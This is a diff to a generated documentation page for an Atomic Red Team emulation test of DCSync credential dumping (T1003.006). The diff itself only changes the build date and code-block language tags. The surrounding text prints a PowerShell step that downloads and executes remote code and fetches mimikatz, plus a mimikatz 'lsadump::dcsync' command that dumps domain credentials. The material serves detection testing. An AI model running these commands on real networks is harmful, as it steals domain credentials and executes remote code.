@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1003.006"
 attack_technique_name: "OS Credential Dumping: DCSync"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.006/T1003.006.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "129efd28-8497-4c87-a1b0-73b9a870ca3e"
@@ -67,14 +67,14 @@ Mimikatz executor must exist on disk and at specified location (#{mimikatz_path}
 
 ### Prerequisite Check
 
-```text
+```powershell
 $mimikatz_path = cmd /c echo #{mimikatz_path}
 if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
 $releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
@@ -91,7 +91,7 @@ Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
 
 ### Command
 
-```commandprompt
+```cmd
 #{mimikatz_path} "lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}" "exit"
 ```
 
